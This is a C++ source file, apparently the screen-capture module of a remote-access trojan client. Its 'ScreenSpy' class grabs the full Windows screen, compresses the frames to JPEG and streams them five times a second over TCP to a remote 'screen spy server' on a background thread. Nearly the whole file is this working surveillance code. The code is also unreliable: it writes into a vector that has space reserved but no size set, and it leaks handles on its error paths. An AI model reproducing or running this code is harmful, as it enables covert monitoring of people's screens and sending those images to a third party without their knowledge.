#include "ScreenSpy.h"

// 互挤体，用来确保线程安全
static CRITICAL_SECTION gCs;
// 初始化类
static ScreenSpy spy;

ScreenSpy::ScreenSpy()
{
    // 初始化互挤体
    InitializeCriticalSection(&gCs);
}

ScreenSpy::~ScreenSpy()
{
    // 删除互挤体
    DeleteCriticalSection(&gCs);
}


bool SaveBmpDataToFile(const std::vector<unsigned char>& imgData)
{
    // 打开文件以进行写入
    std::ofstream outFile("file.bmp", std::ios::binary);
    if (!outFile)
    {
        std::cout << "Failed to open file for writing!" << std::endl;
        return false;
    }

    // 将 imgData 的数据直接写入文件
    outFile.write(reinterpret_cast<const char*>(imgData.data()), imgData.size());

    // 关闭文件
    outFile.close();

    std::cout << "BMP data saved successfully!" << std::endl;
    return true;
}

bool ScreenSpy::captureScreen(std::vector<unsigned char>& bmpData)
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gCs);

    HBITMAP hBitmap;

    // 得到屏幕设备
    HDC hScrDC = CreateDCA("DISPLAY", NULL, NULL, NULL);
    if (!hScrDC) {
        std::cout << "Failed to get screen device" << std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return false;
    }

    // 创建新的设备
    HDC hRamDC = CreateCompatibleDC(hScrDC);
    if (!hRamDC) {
        std::cout << "Failed to create device" << std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return false;
    }

    // 设置图片大小
    unsigned int iByte = 3;  // 每个像素 3 字节（24 位颜色深度）
    unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
    unsigned int iHeight = GetSystemMetrics(SM_CYSCREEN);

    // 向上取整，确保iWidth和iHeight是4的倍数
    iWidth = (iWidth + 3) & ~3;
    iHeight = (iHeight + 3) & ~3;

    // 创建位图
    BITMAPINFOHEADER bmpInfoHeader;
    BITMAPINFO bmpInfo;
    void* p;

    bmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);  // 头结构的大小
    bmpInfoHeader.biBitCount = 24;                    // 24 位颜色深度，每个像素由 R、G、B 三个分量组成
    bmpInfoHeader.biPlanes = 1;                        // 每个像素一个平面
    bmpInfoHeader.biCompression = BI_RGB;              // 无压缩
    bmpInfoHeader.biWidth = iWidth;                    // 图像宽度
    bmpInfoHeader.biHeight = iHeight;                  // 图像高度
    bmpInfoHeader.biSizeImage = 0;                     // 留空，系统会自动计算
    bmpInfoHeader.biXPelsPerMeter = 0;                 // 水平分辨率
    bmpInfoHeader.biYPelsPerMeter = 0;                 // 垂直分辨率
    bmpInfoHeader.biClrUsed = 0;                       // 调色板中的颜色数，0表示没有调色板
    bmpInfoHeader.biClrImportant = 0;                  // 重要颜色数
    bmpInfo.bmiHeader = bmpInfoHeader;                 // 将信息头赋值给 bmiHeader

    // 获取位图
    hBitmap = CreateDIBSection(hScrDC, &bmpInfo, DIB_RGB_COLORS, &p, NULL, 0);
    if (!hBitmap) {
        std::cout << "Failed to CreateDIBSection" << std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return false;
    }

    // 绑定设备与对象
    HBITMAP hBitmapOld;
    hBitmapOld = (HBITMAP)SelectObject(hRamDC, hBitmap);

    // 把屏幕复制到新申请的设备上
    StretchBlt(hRamDC, 0, 0, iWidth, iHeight, hScrDC, 0, 0, iWidth, iHeight, SRCCOPY);

    // 复制图片到内存空间
    bmpData.reserve(iWidth * iHeight * 3);  // Reserve space for RGB data


    HDC hTmpDC = GetDC(NULL);
    hBitmap = (HBITMAP)SelectObject(hRamDC, hBitmapOld);

    bmpInfoHeader.biBitCount = 24;
    int iError = GetDIBits(hTmpDC, hBitmap, 0, iHeight, NULL, (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);
    if (!iError) {
        std::cout << "Failed to GetDIBits" << std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return false;
    }

    // 从内存中获取位图数据
    std::vector<unsigned char> imgData(bmpInfoHeader.biSizeImage);
    iError = GetDIBits(hTmpDC, hBitmap, 0, iHeight, imgData.data(), (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);
    if (!iError) {
        std::cout << "Failed to GetDIBits" << std::endl;
        std::fflush(stdout);

        // 解除函数锁定
        LeaveCriticalSection(&gCs);
        return false;
    }


    // BMP 文件头
    DWORD dwFileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfoHeader.biSizeImage;
    BITMAPFILEHEADER fileHeader = { 0 };
    fileHeader.bfType = 0x4D42;  // 'BM' 文件标识符
    fileHeader.bfSize = dwFileSize;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // 将 BMP 文件头与图像数据合并
    bmpData.clear();
    bmpData.resize(dwFileSize);

    // 写入文件头
    memcpy(bmpData.data(), &fileHeader, sizeof(BITMAPFILEHEADER));
    memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER), &bmpInfoHeader, sizeof(BITMAPINFOHEADER));
    memcpy(bmpData.data() + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), imgData.data(), imgData.size());

    //SaveBmpDataToFile(bmpData);

    // 释放设备与对象
    DeleteDC(hScrDC);
    DeleteDC(hRamDC);
    DeleteObject(hBitmapOld);
    DeleteDC(hTmpDC);
    DeleteObject(hBitmap);

    // 解除函数锁定
    LeaveCriticalSection(&gCs);
    return true;
}


bool SaveToBmpFile(unsigned char* data, size_t size)
{
    // 打开文件以进行写入
    std::ofstream outFile("file.bmp", std::ios::binary);
    if (!outFile)
    {
        std::cout << "Failed to open file for writing!" << std::endl;
        return false;
    }

    // 将数据写入文件
    outFile.write(reinterpret_cast<const char*>(data), size);

    // 关闭文件
    outFile.close();

    std::cout << "BMP data saved successfully!" << std::endl;
    return true;
}


unsigned int  ScreenSpy::convertToJpgData(const std::vector<unsigned char>& bmpData,
    std::vector<unsigned char>& jpgData)
{
    // 锁定函数，其他线程不能进来
    EnterCriticalSection(&gCs);

    //// 设置图片大小
    //unsigned int iByte = 3;
    //unsigned int iWidth = GetSystemMetrics(SM_CXSCREEN);
    //unsigned int iHeight = GetSystemMetrics(SM_CYSCREEN);

    //// 向上取整，确保iWidth和iHeight是4的倍数
    //iWidth = (iWidth + 3) & ~3;
    //iHeight = (iHeight + 3) & ~3;
    //unsigned int iBmpSize = iWidth * iHeight * iByte;
    //if (iWidth == 1366) {
    //    iWidth = 1360;
    //}

    ////  由於bitmap和jpg的儲存方式是相反,所以要把他反過來
    ////  例如: rgb: 1 2 3  ->  9 8 7
    ////            4 5 6  ->  6 5 4
    ////            7 8 9  ->  3 2 1
    //const unsigned char* bmp = bmpData.data();
    //std::vector<unsigned char> convertedBmp;
    //convertedBmp.reserve(iBmpSize);
    //unsigned char* cBmp = (unsigned char*)convertedBmp.data();

    //for (unsigned int i = 0, j; i < iHeight; i++)
    //{
    //    for (j = 0; j < iWidth; j++) {
    //        cBmp[i * iWidth * iByte + j * 3] = bmp[(iHeight - i - 1) * iWidth * iByte + j * iByte + 2];
    //        cBmp[i * iWidth * iByte + j * 3 + 1] = bmp[(iHeight - i - 1) * iWidth * iByte + j * iByte + 1];
    //        cBmp[i * iWidth * iByte + j * 3 + 2] = bmp[(iHeight - i - 1) * iWidth * iByte + j * iByte];
    //    }
    //}

    //// 设置jpg结构
    //struct jpeg_compress_struct jcs;
    //struct jpeg_error_mgr jem;

    //jcs.err = jpeg_std_error(&jem);
    //jpeg_create_compress(&jcs);

    //// 设置输出配置
    //jcs.image_height = iHeight;
    //jcs.image_width = iWidth;
    //jcs.input_components = iByte;
    //jcs.in_color_space = JCS_RGB;

    //jpeg_set_defaults(&jcs);

    //// 设置压缩质量
    //const int quality = 30;     // 越大越好，越小越差，你可以自己设置
    //jpeg_set_quality(&jcs, quality, TRUE);

    //// 设置输出文件（临时文件来的，名字随便设置）
    //const std::string fileName = "zero_client_screen_capture.tmp";
    //FILE* fp = fopen(fileName.data(), "wb+");
    //if (!fp) {
    //    std::cout << "Failed to create file " << fileName << " error:"
    //        << ferror(fp) << std::endl;
    //    std::fflush(stdout);

    //    // 解除函数锁定
    //    LeaveCriticalSection(&gCs);
    //    return 0;
    //}

    //jpeg_stdio_dest(&jcs, fp);

    //// 开始压缩
    //jpeg_start_compress(&jcs, TRUE);
    //JSAMPROW jr;
    //while (jcs.next_scanline < iHeight) {
    //    jr = &cBmp[jcs.next_scanline * iWidth * iByte];
    //    jpeg_write_scanlines(&jcs, &jr, 1);
    //}

    //// 释放
    //jpeg_finish_compress(&jcs);
    //jpeg_destroy_compress(&jcs);
    //fclose(fp);

    //// 读取压缩好的数据
    //FILE* fpIn = fopen(fileName.data(), "rb+");
    //if (!fpIn) {
    //    std::cout << "Failed to read file " << fileName << " error:"
    //        << ferror(fp) << std::endl;
    //    std::fflush(stdout);

    //    // 解除函数锁定
    //    LeaveCriticalSection(&gCs);
    //    return 0;
    //}

    //// 获取jpg文件大小
    //fseek(fpIn, 0, SEEK_END);
    //size_t iLen = ftell(fpIn);
    //rewind(fpIn);

    //// 读取
    //jpgData.reserve(iLen);
    //fread((unsigned char*)jpgData.data(), 1, iLen, fpIn);

    //// 释放
    //fclose(fpIn);

    //// 删除临时文件
    //DeleteFileA(fileName.data());
    jpgData.reserve(bmpData.size());
    //SaveToBmpFile((unsigned char*)bmpData.data(), bmpData.size());
    unsigned int iLen = bmp_to_jpg((unsigned char*)bmpData.data(), jpgData.data());
    //SaveToBmpFile((unsigned char*)jpgData.data(), iLen);
    // 解除函数锁定
    LeaveCriticalSection(&gCs);
    return iLen;
}

void ScreenSpy::startByNewThread(std::string domain, int port)
{
    // 将域名和端口数据转换成一个字符指针类型
    char* args = new char[MAX_PATH + sizeof(int)];
    domain.reserve(MAX_PATH);
    memcpy(args, domain.data(), MAX_PATH);
    memcpy(args + MAX_PATH, (char*)&port, sizeof(int));

    // 创建新线程
    HANDLE h = CreateThread(NULL, 0, ScreenSpy::threadProc, (LPVOID)args, 0, NULL);
    if (!h) {
        std::cout << "Failed to create new thread" << std::endl;
        std::fflush(stdout);
    }
}

DWORD WINAPI ScreenSpy::threadProc(LPVOID args)
{
    char domain[MAX_PATH];
    memcpy(domain, args, MAX_PATH);
    int port = *((int*)((char*)args + MAX_PATH));
    startScreenSpy(domain, port);

    // 释放参数
    delete (char*)args;
    return 0;
}

void ScreenSpy::startScreenSpy(std::string domain, int port)
{
    // 创建socket并连接至服务端
    TcpSocket sock;
    if (!sock.connectTo(domain, port)) {
        std::cout << "Failed to connect screen spy server " << domain << ":" << port << std::endl;
        std::fflush(stdout);
        return;
    }

    // 开始监控消息
    std::cout << "Started screen spy" << std::endl;
    std::fflush(stdout);
    // 截取屏幕，再把它转换成jpg格式
    thread_local std::vector<unsigned char> jpg;
    thread_local std::vector<unsigned char> bmp;

    // 开始传送数据
    const int fps = 5;  // 每秒帧度，你能自己设置
    while (1)
    {
        
        Sleep(1000 / fps);

        

        if (!captureScreen(bmp))
        {
            sock.dissconnect();
            break;
        }

        unsigned int len = 0;
        if ((len = convertToJpgData(bmp, jpg)) == 0)
        {
            sock.dissconnect();
            break;
        }

        // 发送数据
        if (!sendScreenData(&sock, jpg, len))
        {
            break;
        }


    }


    //bmp.clear();
    //jpg.clear();

    // 完成
    std::cout << "Finished screen spy" << std::endl;
    std::fflush(stdout);
}

bool ScreenSpy::sendScreenData(TcpSocket* sock, std::vector<unsigned char>& jpg, unsigned int len)
{
    // 发送头包
    ScreenSpyHeader header;
    header.len = len;
    if (!sock->sendData((char*)&header, sizeof(ScreenSpyHeader))) {  //如果直接发送一整块数据，接收端就无法提前知道数据的总长度，可能导致数据处理复杂化。
        return false;
    }

    // 发送jpg数据包，包大小每次最好少于1000，我这里定义800
    const unsigned int paketLen = 800;
    char* data = (char*)jpg.data();
    unsigned int pos = 0;//pos：已发送数据的位置（偏移量），初始为 0。

    while (pos < len) {
        int sendSize = (pos + paketLen) > len ? len - pos : paketLen;

        if (!sock->sendData(data + pos, sendSize)) {  //将 data + pos 开始的 sendSize 字节发送到网络。
            return false;
        }

        pos += sendSize;
    }

    return true;
}
